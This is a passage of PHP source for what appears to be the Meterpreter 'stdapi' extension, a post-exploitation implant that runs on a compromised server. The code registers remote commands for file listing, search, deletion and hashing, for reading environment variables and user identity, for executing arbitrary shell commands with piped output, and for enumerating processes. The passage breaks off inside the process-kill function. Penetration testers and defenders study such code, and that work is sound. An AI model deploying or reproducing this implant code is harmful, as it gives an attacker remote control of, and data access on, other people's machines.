#<?php
##
# STDAPI
##

##
# General
##
define("TLV_TYPE_HANDLE",              TLV_META_TYPE_UINT    |  600);
define("TLV_TYPE_INHERIT",             TLV_META_TYPE_BOOL    |  601);
define("TLV_TYPE_PROCESS_HANDLE",      TLV_META_TYPE_UINT    |  630);
define("TLV_TYPE_THREAD_HANDLE",       TLV_META_TYPE_UINT    |  631);

##
# Fs
##
define("TLV_TYPE_DIRECTORY_PATH",      TLV_META_TYPE_STRING  | 1200);
define("TLV_TYPE_FILE_NAME",           TLV_META_TYPE_STRING  | 1201);
define("TLV_TYPE_FILE_PATH",           TLV_META_TYPE_STRING  | 1202);
define("TLV_TYPE_FILE_MODE",           TLV_META_TYPE_STRING  | 1203);
define("TLV_TYPE_FILE_SIZE",           TLV_META_TYPE_UINT    | 1204);

define("TLV_TYPE_STAT_BUF",            TLV_META_TYPE_COMPLEX | 1220);

define("TLV_TYPE_SEARCH_RECURSE",      TLV_META_TYPE_BOOL    | 1230);
define("TLV_TYPE_SEARCH_GLOB",         TLV_META_TYPE_STRING  | 1231);
define("TLV_TYPE_SEARCH_ROOT",         TLV_META_TYPE_STRING  | 1232);
define("TLV_TYPE_SEARCH_RESULTS",      TLV_META_TYPE_GROUP   | 1233);

##
# Net
##
define("TLV_TYPE_HOST_NAME",           TLV_META_TYPE_STRING  | 1400);
define("TLV_TYPE_PORT",                TLV_META_TYPE_UINT    | 1401);

define("TLV_TYPE_SUBNET",              TLV_META_TYPE_RAW     | 1420);
define("TLV_TYPE_NETMASK",             TLV_META_TYPE_RAW     | 1421);
define("TLV_TYPE_GATEWAY",             TLV_META_TYPE_RAW     | 1422);
define("TLV_TYPE_NETWORK_ROUTE",       TLV_META_TYPE_GROUP   | 1423);

define("TLV_TYPE_IP",                  TLV_META_TYPE_RAW     | 1430);
define("TLV_TYPE_MAC_ADDRESS",         TLV_META_TYPE_RAW     | 1431);
define("TLV_TYPE_MAC_NAME",            TLV_META_TYPE_STRING  | 1432);
define("TLV_TYPE_NETWORK_INTERFACE",   TLV_META_TYPE_GROUP   | 1433);

define("TLV_TYPE_SUBNET_STRING",       TLV_META_TYPE_STRING  | 1440);
define("TLV_TYPE_NETMASK_STRING",      TLV_META_TYPE_STRING  | 1441);
define("TLV_TYPE_GATEWAY_STRING",      TLV_META_TYPE_STRING  | 1442);

# Socket
define("TLV_TYPE_PEER_HOST",           TLV_META_TYPE_STRING  | 1500);
define("TLV_TYPE_PEER_PORT",           TLV_META_TYPE_UINT    | 1501);
define("TLV_TYPE_LOCAL_HOST",          TLV_META_TYPE_STRING  | 1502);
define("TLV_TYPE_LOCAL_PORT",          TLV_META_TYPE_UINT    | 1503);
define("TLV_TYPE_CONNECT_RETRIES",     TLV_META_TYPE_UINT    | 1504);

define("TLV_TYPE_SHUTDOWN_HOW",        TLV_META_TYPE_UINT    | 1530);

##
# Sys
##
define("PROCESS_EXECUTE_FLAG_HIDDEN", (1 << 0));
define("PROCESS_EXECUTE_FLAG_CHANNELIZED", (1 << 1));
define("PROCESS_EXECUTE_FLAG_SUSPENDED", (1 << 2));
define("PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN", (1 << 3));

# Registry
define("TLV_TYPE_HKEY",                TLV_META_TYPE_UINT    | 1000);
define("TLV_TYPE_ROOT_KEY",            TLV_TYPE_HKEY);
define("TLV_TYPE_BASE_KEY",            TLV_META_TYPE_STRING  | 1001);
define("TLV_TYPE_PERMISSION",          TLV_META_TYPE_UINT    | 1002);
define("TLV_TYPE_KEY_NAME",            TLV_META_TYPE_STRING  | 1003);
define("TLV_TYPE_VALUE_NAME",          TLV_META_TYPE_STRING  | 1010);
define("TLV_TYPE_VALUE_TYPE",          TLV_META_TYPE_UINT    | 1011);
define("TLV_TYPE_VALUE_DATA",          TLV_META_TYPE_RAW     | 1012);

# Config
define("TLV_TYPE_COMPUTER_NAME",       TLV_META_TYPE_STRING  | 1040);
define("TLV_TYPE_OS_NAME",             TLV_META_TYPE_STRING  | 1041);
define("TLV_TYPE_USER_NAME",           TLV_META_TYPE_STRING  | 1042);
define("TLV_TYPE_ARCHITECTURE",        TLV_META_TYPE_STRING  | 1043);
define("TLV_TYPE_LANG_SYSTEM",         TLV_META_TYPE_STRING  | 1044);

# Environment
define("TLV_TYPE_ENV_VARIABLE",        TLV_META_TYPE_STRING  | 1100);
define("TLV_TYPE_ENV_VALUE",           TLV_META_TYPE_STRING  | 1101);
define("TLV_TYPE_ENV_GROUP",           TLV_META_TYPE_GROUP   | 1102);


define("DELETE_KEY_FLAG_RECURSIVE", (1 << 0));

# Process
define("TLV_TYPE_BASE_ADDRESS",        TLV_META_TYPE_UINT    | 2000);
define("TLV_TYPE_ALLOCATION_TYPE",     TLV_META_TYPE_UINT    | 2001);
define("TLV_TYPE_PROTECTION",          TLV_META_TYPE_UINT    | 2002);
define("TLV_TYPE_PROCESS_PERMS",       TLV_META_TYPE_UINT    | 2003);
define("TLV_TYPE_PROCESS_MEMORY",      TLV_META_TYPE_RAW     | 2004);
define("TLV_TYPE_ALLOC_BASE_ADDRESS",  TLV_META_TYPE_UINT    | 2005);
define("TLV_TYPE_MEMORY_STATE",        TLV_META_TYPE_UINT    | 2006);
define("TLV_TYPE_MEMORY_TYPE",         TLV_META_TYPE_UINT    | 2007);
define("TLV_TYPE_ALLOC_PROTECTION",    TLV_META_TYPE_UINT    | 2008);
define("TLV_TYPE_PID",                 TLV_META_TYPE_UINT    | 2300);
define("TLV_TYPE_PROCESS_NAME",        TLV_META_TYPE_STRING  | 2301);
define("TLV_TYPE_PROCESS_PATH",        TLV_META_TYPE_STRING  | 2302);
define("TLV_TYPE_PROCESS_GROUP",       TLV_META_TYPE_GROUP   | 2303);
define("TLV_TYPE_PROCESS_FLAGS",       TLV_META_TYPE_UINT    | 2304);
define("TLV_TYPE_PROCESS_ARGUMENTS",   TLV_META_TYPE_STRING  | 2305);

define("TLV_TYPE_IMAGE_FILE",          TLV_META_TYPE_STRING  | 2400);
define("TLV_TYPE_IMAGE_FILE_PATH",     TLV_META_TYPE_STRING  | 2401);
define("TLV_TYPE_PROCEDURE_NAME",      TLV_META_TYPE_STRING  | 2402);
define("TLV_TYPE_PROCEDURE_ADDRESS",   TLV_META_TYPE_UINT    | 2403);
define("TLV_TYPE_IMAGE_BASE",          TLV_META_TYPE_UINT    | 2404);
define("TLV_TYPE_IMAGE_GROUP",         TLV_META_TYPE_GROUP   | 2405);
define("TLV_TYPE_IMAGE_NAME",          TLV_META_TYPE_STRING  | 2406);

define("TLV_TYPE_THREAD_ID",           TLV_META_TYPE_UINT    | 2500);
define("TLV_TYPE_THREAD_PERMS",        TLV_META_TYPE_UINT    | 2502);
define("TLV_TYPE_EXIT_CODE",           TLV_META_TYPE_UINT    | 2510);
define("TLV_TYPE_ENTRY_POINT",         TLV_META_TYPE_UINT    | 2511);
define("TLV_TYPE_ENTRY_PARAMETER",     TLV_META_TYPE_UINT    | 2512);
define("TLV_TYPE_CREATION_FLAGS",      TLV_META_TYPE_UINT    | 2513);

define("TLV_TYPE_REGISTER_NAME",       TLV_META_TYPE_STRING  | 2540);
define("TLV_TYPE_REGISTER_SIZE",       TLV_META_TYPE_UINT    | 2541);
define("TLV_TYPE_REGISTER_VALUE_32",   TLV_META_TYPE_UINT    | 2542);
define("TLV_TYPE_REGISTER",            TLV_META_TYPE_GROUP   | 2550);

##
# Ui
##
define("TLV_TYPE_IDLE_TIME",           TLV_META_TYPE_UINT    | 3000);
define("TLV_TYPE_KEYS_DUMP",           TLV_META_TYPE_STRING  | 3001);
define("TLV_TYPE_DESKTOP",             TLV_META_TYPE_STRING  | 3002);

##
# Event Log
##
define("TLV_TYPE_EVENT_SOURCENAME",    TLV_META_TYPE_STRING  | 4000);
define("TLV_TYPE_EVENT_HANDLE",        TLV_META_TYPE_UINT    | 4001);
define("TLV_TYPE_EVENT_NUMRECORDS",    TLV_META_TYPE_UINT    | 4002);

define("TLV_TYPE_EVENT_READFLAGS",     TLV_META_TYPE_UINT    | 4003);
define("TLV_TYPE_EVENT_RECORDOFFSET",  TLV_META_TYPE_UINT    | 4004);

define("TLV_TYPE_EVENT_RECORDNUMBER",  TLV_META_TYPE_UINT    | 4006);
define("TLV_TYPE_EVENT_TIMEGENERATED", TLV_META_TYPE_UINT    | 4007);
define("TLV_TYPE_EVENT_TIMEWRITTEN",   TLV_META_TYPE_UINT    | 4008);
define("TLV_TYPE_EVENT_ID",            TLV_META_TYPE_UINT    | 4009);
define("TLV_TYPE_EVENT_TYPE",          TLV_META_TYPE_UINT    | 4010);
define("TLV_TYPE_EVENT_CATEGORY",      TLV_META_TYPE_UINT    | 4011);
define("TLV_TYPE_EVENT_STRING",        TLV_META_TYPE_STRING  | 4012);
define("TLV_TYPE_EVENT_DATA",          TLV_META_TYPE_RAW     | 4013);

##
# Power
##
define("TLV_TYPE_POWER_FLAGS",         TLV_META_TYPE_UINT    | 4100);
define("TLV_TYPE_POWER_REASON",        TLV_META_TYPE_UINT    | 4101);

##
# Errors
##

# Special return value to match up with Windows error codes for network
# errors.
define("ERROR_CONNECTION_ERROR", 10000);

# Wrap everything in checks for existence of the new functions in case we get
# eval'd twice
my_print("Evaling stdapi");

##
# Search Helpers
##

# Stolen from user comments in http://us2.php.net/manual/en/function.glob.php
# The recursiveness was busted, fixed it by adding the path to the filename
# when checking whether we're looking at a directory.
# Used by stdapi_fs_search
/**#@+
 * Extra GLOB constant for safe_glob()
 */
define('GLOB_NODIR',256);
define('GLOB_PATH',512);
define('GLOB_NODOTS',1024);
define('GLOB_RECURSE',2048);
/**#@-*/
/**
 * A safe empowered glob().
 *
 * Function glob() is prohibited on some server (probably in safe mode)
 * (Message "Warning: glob() has been disabled for security reasons in
 * (script) on line (line)") for security reasons as stated on:
 * http://seclists.org/fulldisclosure/2005/Sep/0001.html
 *
 * safe_glob() intends to replace glob() using readdir() & fnmatch() instead.
 * Supported flags: GLOB_MARK, GLOB_NOSORT, GLOB_ONLYDIR
 * Additional flags: GLOB_NODIR, GLOB_PATH, GLOB_NODOTS, GLOB_RECURSE
 * (not original glob() flags)
 * @author BigueNique AT yahoo DOT ca
 * @updates
 * - 080324 Added support for additional flags: GLOB_NODIR, GLOB_PATH,
 *   GLOB_NODOTS, GLOB_RECURSE
 */
if (!function_exists('safe_glob')) {
function safe_glob($pattern, $flags=0) {
    $split=explode('/',str_replace('\\','/',$pattern));
    $mask=array_pop($split);
    $path=implode('/',$split);
    if (($dir=opendir($path))!==false) {
        $glob=array();
        while (($file=readdir($dir))!==false) {
            // Recurse subdirectories (GLOB_RECURSE)
            if (
                (
                    $flags&GLOB_RECURSE) && is_dir($path."/".$file)
                    && (!in_array($file,array('.','..'))
                    # don't follow links to avoid infinite recursion
                    && (!is_link($path."/".$file))
                )
            ) {
                $glob = array_merge($glob, array_prepend(safe_glob($path.'/'.$file.'/'.$mask, $flags),
                    ($flags&GLOB_PATH?'':$file.'/')));
            }
            // Match file mask
            if (fnmatch($mask,$file)) {
                if ( ( (!($flags&GLOB_ONLYDIR)) || is_dir("$path/$file") )
                    && ( (!($flags&GLOB_NODIR)) || (!is_dir($path.'/'.$file)) )
                    && ( (!($flags&GLOB_NODOTS)) || (!in_array($file,array('.','..'))) ) )
                    $glob[] = ($flags&GLOB_PATH?$path.'/':'') . $file . ($flags&GLOB_MARK?'/':'');
            }
        }
        closedir($dir);
        if (!($flags&GLOB_NOSORT)) sort($glob);
        return $glob;
    } else {
        return false;
    }
}
}
/**
 * A better "fnmatch" alternative for windows that converts a fnmatch
 * pattern into a preg one. It should work on PHP >= 4.0.0.
 * @author soywiz at php dot net
 * @since 17-Jul-2006 10:12
 */
if (!function_exists('fnmatch')) {
function fnmatch($pattern, $string) {
    return @preg_match('/^' . strtr(addcslashes($pattern, '\\/.+^$(){}=!<>|'), array('*' => '.*', '?' => '.?')) . '$/i', $string);
}
}

/**
 * Prepends $string to each element of $array
 * If $deep is true, will indeed also apply to sub-arrays
 * @author BigueNique AT yahoo DOT ca
 * @since 080324
 */
if (!function_exists('array_prepend')) {
function array_prepend($array, $string, $deep=false) {
    if(empty($array)||empty($string)) return $array;
    foreach($array as $key => $element)
        if(is_array($element))
            if($deep)
                $array[$key] = array_prepend($element,$string,$deep);
            else
                trigger_error('array_prepend: array element',E_USER_WARNING);
        else
            $array[$key] = $string.$element;
    return $array;

}
}


## END Search Helpers

if (!function_exists('cononicalize_path')) {
function cononicalize_path($path) {
    $path = str_replace(array("/", "\\"), DIRECTORY_SEPARATOR, $path);
    return $path;
}
}


#
# Need to nail down what this should actually do.  Ruby's File.expand_path is
# for cononicalizing a path (e.g., removing /./ and ../) and expanding "~" into
# a path to the current user's homedir.  In contrast, Meterpreter has
# traditionally used this to get environment variables from the server.
#
if (!function_exists('stdapi_fs_file_expand_path')) {
register_command('stdapi_fs_file_expand_path');
function stdapi_fs_file_expand_path($req, &$pkt) {
    my_print("doing expand_path");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $env = $path_tlv['value'];
    my_print("Request for: '$env'");
    if (!is_windows()) {
        # Handle some basic windows-isms when we can
        switch ($env) {
        case "%COMSPEC%":
            $path = "/bin/sh";
            break;
        case "%TEMP%":
        case "%TMP%":
            $path = "/tmp";
            break;
        default:
            # Don't know what the user meant, just try it as an environment
            # variable and hope for the best.
            $path = getenv($env);
        }
    } else {
        $path = getenv($env);
        if (empty($path) and ($env == "%COMSPEC%")) {
            # hope it's in the path
            $path = "cmd.exe";
        }
    }
    my_print("Returning with an answer of: '$path'");

    if ($path) {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path));
        return ERROR_SUCCESS;
    }
    return ERROR_FAILURE;
}
}

if (!function_exists('stdapi_fs_delete_dir')) {
register_command('stdapi_fs_delete_dir');
function stdapi_fs_delete_dir($req, &$pkt) {
    my_print("doing rmdir");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    $ret = @rmdir(cononicalize_path($path_tlv['value']));
    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
}
}

if (!function_exists('stdapi_fs_mkdir')) {
register_command('stdapi_fs_mkdir');
function stdapi_fs_mkdir($req, &$pkt) {
    my_print("doing mkdir");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    $ret = @mkdir(cononicalize_path($path_tlv['value']));
    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_fs_chdir')) {
register_command('stdapi_fs_chdir');
function stdapi_fs_chdir($req, &$pkt) {
    my_print("doing chdir");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    $ret = @chdir(cononicalize_path($path_tlv['value']));
    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_fs_delete')) {
register_command('stdapi_fs_delete');
function stdapi_fs_delete($req, &$pkt) {
    my_print("doing delete");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_NAME);
    $ret = @unlink(cononicalize_path($path_tlv['value']));
    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_fs_getwd')) {
register_command('stdapi_fs_getwd');
function stdapi_fs_getwd($req, &$pkt) {
    my_print("doing pwd");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, getcwd()));
    return ERROR_SUCCESS;
}
}

# works partially, need to get the path argument to mean the same thing as in
# windows
if (!function_exists('stdapi_fs_ls')) {
register_command('stdapi_fs_ls');
function stdapi_fs_ls($req, &$pkt) {
    my_print("doing ls");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    $path = cononicalize_path($path_tlv['value']);
    $dir_handle = @opendir($path);

    if ($dir_handle) {
        while ($file = readdir($dir_handle)) {
            if ($file != "." && $file != "..") {
                #my_print("Adding file $file");
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $file));
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path . DIRECTORY_SEPARATOR . $file));
                $st = stat($path . DIRECTORY_SEPARATOR . $file);
                $st_buf = "";
                $st_buf .= pack("V", $st['dev']);
                $st_buf .= pack("v", $st['ino']);
                $st_buf .= pack("v", $st['mode']);
                $st_buf .= pack("v", $st['nlink']);
                $st_buf .= pack("v", $st['uid']);
                $st_buf .= pack("v", $st['gid']);
                $st_buf .= pack("v", 0);
                $st_buf .= pack("V", $st['rdev']);
                $st_buf .= pack("V", $st['size']);
                $st_buf .= pack("V", $st['atime']);
                $st_buf .= pack("V", $st['mtime']);
                $st_buf .= pack("V", $st['ctime']);
                $st_buf .= pack("V", $st['blksize']);
                $st_buf .= pack("V", $st['blocks']);
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
            }
        }
        closedir($dir_handle);
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}
}

if (!function_exists('stdapi_fs_separator')) {
register_command('stdapi_fs_separator');
function stdapi_fs_separator($req, &$pkt) {
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_STRING, DIRECTORY_SEPARATOR));
    return ERROR_SUCCESS;
}
}

if (!function_exists('stdapi_fs_stat')) {
register_command('stdapi_fs_stat');
function stdapi_fs_stat($req, &$pkt) {
    my_print("doing stat");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $path = cononicalize_path($path_tlv['value']);

    $st = stat($path);
    if ($st) {
        $st_buf = "";
        $st_buf .= pack("V", $st['dev']);
        $st_buf .= pack("v", $st['ino']);
        $st_buf .= pack("v", $st['mode']);
        $st_buf .= pack("v", $st['nlink']);
        $st_buf .= pack("v", $st['uid']);
        $st_buf .= pack("v", $st['gid']);
        $st_buf .= pack("v", 0);
        $st_buf .= pack("V", $st['rdev']);
        $st_buf .= pack("V", $st['size']);
        $st_buf .= pack("V", $st['atime']);
        $st_buf .= pack("V", $st['mtime']);
        $st_buf .= pack("V", $st['ctime']);
        $st_buf .= pack("V", $st['blksize']);
        $st_buf .= pack("V", $st['blocks']);
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}
}

# works
if (!function_exists('stdapi_fs_delete_file')) {
register_command('stdapi_fs_delete_file');
function stdapi_fs_delete_file($req, &$pkt) {
    my_print("doing delete");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $path = cononicalize_path($path_tlv['value']);

    if ($path && is_file($path)) {
        $worked = @unlink($path);
        return ($worked ? ERROR_SUCCESS : ERROR_FAILURE);
    } else {
        return ERROR_FAILURE;
    }
}
}

if (!function_exists('stdapi_fs_search')) {
register_command('stdapi_fs_search');
function stdapi_fs_search($req, &$pkt) {
    my_print("doing search");

    $root_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_ROOT);
    $root = cononicalize_path($root_tlv['value']);
    $glob_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_GLOB);
    $glob = cononicalize_path($glob_tlv['value']);
    $recurse_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_RECURSE);
    $recurse = $recurse_tlv['value'];

    if (!$root) {
        $root = '.';
    }

    my_print("glob: $glob, root: $root, recurse: $recurse");
    $flags = GLOB_PATH;
    if ($recurse) {
        $flags |= GLOB_RECURSE;
    }
    $files = safe_glob($root ."/". $glob, $flags);
    if ($files and is_array($files)) {
        dump_array($files);
        foreach ($files as $file) {
            $file_tlvs = "";
            $s = stat($file);
            $p = dirname($file);
            $f = basename($file);
            $file_tlvs .= tlv_pack(create_tlv(TLV_TYPE_FILE_PATH, $p));
            $file_tlvs .= tlv_pack(create_tlv(TLV_TYPE_FILE_NAME, $f));
            $file_tlvs .= tlv_pack(create_tlv(TLV_TYPE_FILE_SIZE, $s['size']));
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_SEARCH_RESULTS, $file_tlvs));
        }
    }
    return ERROR_SUCCESS;
}
}


if (!function_exists('stdapi_fs_md5')) {
register_command("stdapi_fs_md5");
function stdapi_fs_md5($req, &$pkt) {
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $path = cononicalize_path($path_tlv['value']);

    if (is_callable("md5_file")) {
        $md5 = md5_file($path);
    } else {
        $md5 = md5(file_get_contents($path));
    }
    $md5 = pack("H*", $md5);
    # Ghetto abuse of file name type to indicate the md5 result
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $md5));
    return ERROR_SUCCESS;
}
}


if (!function_exists('stdapi_fs_sha1')) {
register_command("stdapi_fs_sha1");
function stdapi_fs_sha1($req, &$pkt) {
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $path = cononicalize_path($path_tlv['value']);

    if (is_callable("sha1_file")) {
        $sha1 = sha1_file($path);
    } else {
        $sha1 = sha1(file_get_contents($path));
    }
    $sha1 = pack("H*", $sha1);
    # Ghetto abuse of file name type to indicate the sha1 result
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $sha1));
    return ERROR_SUCCESS;
}
}


# Sys Config

# works
if (!function_exists('stdapi_sys_config_getuid')) {
register_command('stdapi_sys_config_getuid');
function stdapi_sys_config_getuid($req, &$pkt) {
    my_print("doing getuid");
    if (is_callable('posix_getuid')) {
        $uid = posix_getuid();
        $pwinfo = posix_getpwuid($uid);
        $user = $pwinfo['name'] . " ($uid)";
    } else {
        # The posix functions aren't available, this is probably windows.  Use
        # the functions for getting user name and uid based on file ownership
        # instead.
        $user = get_current_user() . " (" . getmyuid() . ")";
    }
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_USER_NAME, $user));
    return ERROR_SUCCESS;
}
}

if (!function_exists('stdapi_sys_config_getenv')) {
register_command('stdapi_sys_config_getenv');
function stdapi_sys_config_getenv($req, &$pkt) {
    my_print("doing getenv");

    $variable_tlvs = packet_get_all_tlvs($req, TLV_TYPE_ENV_VARIABLE);

    # If we decide some day to have sys.config.getenv return all env
    # vars when given an empty search list, this is one way to do it.
    #if (empty($variable_tlvs)) {
    #    # We don't have a var to look up, return all of 'em
    #    $variables = array_keys($_SERVER);
    #} else {
    #    $variables = array();
    #    foreach ($variable_tlvs as $tlv) {
    #        array_push($variables, $tlv['value']);
    #    }
    #}

    foreach ($variable_tlvs as $name) {
        $canonical_name = str_replace(array("$","%"), "", $name['value']);
        $env = getenv($canonical_name);
        if ($env !== FALSE) {
            $grp = "";
            $grp .= tlv_pack(create_tlv(TLV_TYPE_ENV_VARIABLE, $canonical_name));
            $grp .= tlv_pack(create_tlv(TLV_TYPE_ENV_VALUE, $env));
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_ENV_GROUP, $grp));
        }
    }

    return ERROR_SUCCESS;
}
}


# Unimplemented becuase it's unimplementable
#if (!function_exists('stdapi_sys_config_rev2self')) {
#register_command('stdapi_sys_config_rev2self');
#function stdapi_sys_config_rev2self($req, &$pkt) {
#    my_print("doing rev2self");
#    return ERROR_FAILURE;
#}
#}

# works
if (!function_exists('stdapi_sys_config_sysinfo')) {
register_command('stdapi_sys_config_sysinfo');
function stdapi_sys_config_sysinfo($req, &$pkt) {
    my_print("doing sysinfo");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMPUTER_NAME, php_uname("n")));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_OS_NAME, php_uname()));
    return ERROR_SUCCESS;
}
}

# Global list of processes so we know what to kill when a channel gets closed
$GLOBALS['processes'] = array();

if (!function_exists('stdapi_sys_process_execute')) {
register_command('stdapi_sys_process_execute');
function stdapi_sys_process_execute($req, &$pkt) {
    global $channel_process_map, $processes;

    my_print("doing execute");
    $cmd_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_PATH);
    $args_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_ARGUMENTS);
    $flags_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_FLAGS);

    $cmd = $cmd_tlv['value'];
    $args = $args_tlv['value'];
    $flags = $flags_tlv['value'];

    # If there was no command specified, well, a user sending an empty command
    # deserves failure.
    my_print("Cmd: $cmd $args");
    if (0 > strlen($cmd)) {
        return ERROR_FAILURE;
    }
    $real_cmd = $cmd ." ". $args;

    $pipe_desc = array(array('pipe','r'), array('pipe','w'));
    if (is_windows()) {
        # see http://us2.php.net/manual/en/function.proc-open.php#97012
        array_push($pipe_desc, array('pipe','a'));
    } else {
        array_push($pipe_desc, array('pipe','w'));
    }

    # Now that we've got the command built, run it. If it worked, we'll send
    # back a handle identifier.
    $handle = proc_open($real_cmd, $pipe_desc, $pipes);
    if (!is_resource($handle)) {
        return ERROR_FAILURE;
    }

    if (is_callable('proc_get_status')) {
        $status = proc_get_status($handle);
        $pid = $status['pid'];
    } else {
        $pid = 0;
    }

    $proc = array( 'handle' => $handle, 'pipes' => $pipes );
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, $pid));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)));
    if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
        my_print("Channelized");
        # Then the client wants a channel set up to handle this process' stdio,
        # register all the necessary junk to make that happen.
        foreach ($pipes as $p) {
            register_stream($p);
        }
        #stream_set_blocking($pipes[0], 1);
        #stream_set_blocking($pipes[1], 1);
        #stream_set_blocking($pipes[2], 1);

        $cid = register_channel($pipes[0], $pipes[1], $pipes[2]);
        $channel_process_map[$cid] = $proc;

        $proc['cid'] = $cid;

        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
    #} else {
        # Otherwise, don't care about stdin/stdout, just run the command
    }

    $processes[] = $proc;

    return ERROR_SUCCESS;
}
}


if (!function_exists('stdapi_sys_process_close')) {
register_command('stdapi_sys_process_close');
function stdapi_sys_process_close($req, &$pkt) {
    global $processes;
    my_print("doing process_close");
    $handle_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_HANDLE);
    if (array_key_exists($handle_tlv['value'], $processes)) {
        close_process($processes[$handle_tlv['value']]);
    }

    return ERROR_SUCCESS;
}
}

if (!function_exists('close_process')) {
function close_process($proc) {
    if ($proc) {
        my_print("Closing process handle {$proc['handle']}");
        # In the case of a channelized process, this will be redundant as the
        # channel_close will also try to close all of these handles.  There's no
        # real harm in that, so go ahead and just always make sure they get
        # closed.
        foreach ($proc['pipes'] as $f) {
            @fclose($f);
        }
        if (is_callable('proc_get_status')) {
            $status = proc_get_status($proc['handle']);
        } else {
            # fake a running process on php < 4.3
            $status = array('running' => true);
        }

        # proc_close blocks waiting for the child to exit, so if it's still
        # running, don't take a chance on deadlock and just sigkill it if we
        # can.  We can't on php < 4.3, so don't do anything.  This will leave
        # zombie processes, but that's better than deadlock.
        if ($status['running'] == false) {
            proc_close($proc['handle']);
        } else {
            if (is_callable('proc_terminate')) {
                proc_terminate($proc['handle'], 9);
            }
        }
        if (array_key_exists('cid', $proc) && $channel_process_map[$proc['cid']]) {
            unset($channel_process_map[$proc['cid']]);
        }
    }
}
}

# Works, but not very portable.  There doesn't appear to be a PHP way of
# getting a list of processes, so we just shell out to ps/tasklist.exe.  I need
# to decide what options to send to ps for portability and for information
# usefulness.
if (!function_exists('stdapi_sys_process_get_processes')) {
register_command('stdapi_sys_process_get_processes');
function stdapi_sys_process_get_processes($req, &$pkt) {
    my_print("doing get_processes");
    $list = array();
    if (is_windows()) {
        # This command produces a line like:
        #  "tasklist.exe","2264","Console","0","4,556 K","Running","EGYPT-B3E55BF3C\Administrator","0:00:00","OleMainThreadWndName"
        $output = my_cmd("tasklist /v /fo csv /nh");
        $lines = explode("\n", trim($output));
        foreach ($lines as $line) {
            $line = trim($line);
            #
            # Ghetto CSV parsing
            #
            $pieces = preg_split('/","/', $line);
            # Strip off the initial quote on the first and last elements
            $pieces[0] = substr($pieces[0], 1, strlen($pieces[0]));
            $cnt = count($pieces) - 1;
            $pieces[$cnt] = substr($pieces[$cnt], 1, strlen($pieces[$cnt]));

            $proc_info = array($pieces[1], $pieces[6], $pieces[0]);
            array_push($list, $proc_info);
        }
    } else {
        # This command produces a line like:
        #    1553 root     /sbin/getty -8 38400 tty1
        $output = my_cmd("ps ax -w -o pid,user,cmd --no-header 2>/dev/null");
        $lines = explode("\n", trim($output));
        foreach ($lines as $line) {
            array_push($list, preg_split("/\s+/", trim($line)));
        }
    }
    foreach ($list as $proc) {
        $grp = "";
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PID, $proc[0]));
        $grp .= tlv_pack(create_tlv(TLV_TYPE_USER_NAME, $proc[1]));
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_NAME, $proc[2]));
        # Strip the pid and the user name off the front; the rest will be the
        # full command line
        array_shift($proc);
        array_shift($proc);
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join($proc, " ")));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_GROUP, $grp));
    }
    return ERROR_SUCCESS;
}
}

# works
if (!function_exists('stdapi_sys_process_getpid')) {
register_command('stdapi_sys_process_getpid');
function stdapi_sys_process_getpid($req, &$pkt) {
    my_print("doing getpid");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, getmypid()));
    return ERROR_SUCCESS;
}
}

if (!function_exists('stdapi_sys_process_kill')) {
register_command('stdapi_sys_process_kill');
function stdapi_sys_process_kill($req, &$pkt) {
    # The existence of posix_kill is unlikely (it's a php compile-time option
    # that isn't enabled by default, but better to try it and avoid shelling
    # out when unnecessary.
    my_print("doing kill");
    $pid_tlv = packet_get_tlv($req, TLV_TYPE_PID);
